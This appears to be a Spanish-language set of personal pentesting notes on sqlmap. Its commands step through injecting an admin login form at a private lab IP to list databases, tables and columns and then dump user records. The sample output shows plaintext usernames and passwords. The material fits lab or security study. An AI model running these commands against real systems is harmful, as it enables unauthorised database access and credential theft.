Herramienta,  que nos permite de forma automatizada realizar una explotación de esta vulnerabilidad y poder acceder a las tablas, columnas y registros de la base de datos objetivo.

Uso para panel de administrador

extraer las bases de datos

```sh fold:"SQLMap descubrir bases de datos"
sqlmap -u http://192.168.1.141/administrator/ --forms --dbs --batch
```
ejemplo de salida:
[*] information_schema                                                                                                  
[*] mysql
[*] performance_schema
[*] Webapp


ahora vamos a conocer las tablas de la base de datos Webapp
```sh fold:"SQLMap descubrir tablas de una BD"
sqlmap -u http://192.168.1.141/administrator/ --forms -D {DB_Name} --tables --batch
```


Ejemplo de salida:
Database: Webapp                                                                                                                                   
[1 table]                                                                                                                                          
+-------+                                                                                                                                          
| Users |
+-------+


Ahora vamos a  sacar las columnas de la tabla Users
```sh fold:"SQLMap descubrir columnas de una tabla"
sqlmap -u http://192.168.1.141/administrator/ --forms -D {DB_Name} -T {Table_name} --columns --batch
```

Ejemplo de salida:
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(6)      |
| password | varchar(32) |
| username | varchar(32) |
+----------+-------------+



Ahora vamos a sacar los registros de las columnas

```sh fold:"SQLMap descubrir registros de una tabla"
sqlmap -u http://192.168.1.141/administrator/ --forms -D {DB_Name} -T {Table_name} -C {column1,column1,column3} --dump --batch
```

ejemplo de salida:
Database: Webapp
Table: Users
[4 entries]
+----------+--------------+
| username | password     |
+----------+--------------+
| bart     | b4rtp0w4     |
| liam     | liam@nd3rs0n |
| mike     | mikeblabla   |
| peter    | peter123!    |
+----------+--------------+


## Dump con sqlmap

recomendado solo si la BD es pequeña
```sh fold:"Haacer un DUMP de una BD con SQL MAP"
sqlmap -u http://192.168.1.141/administrator/ --forms --dump --batch
```




https://www.youtube.com/watch?v=pF7uz_ptuFc

<iframe width="560" height="315" src="https://www.youtube.com/embed/pF7uz_ptuFc?si=6uzvXvY5-_lbZuaL" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>




https://www.youtube.com/shorts/MQLrXU3KzxU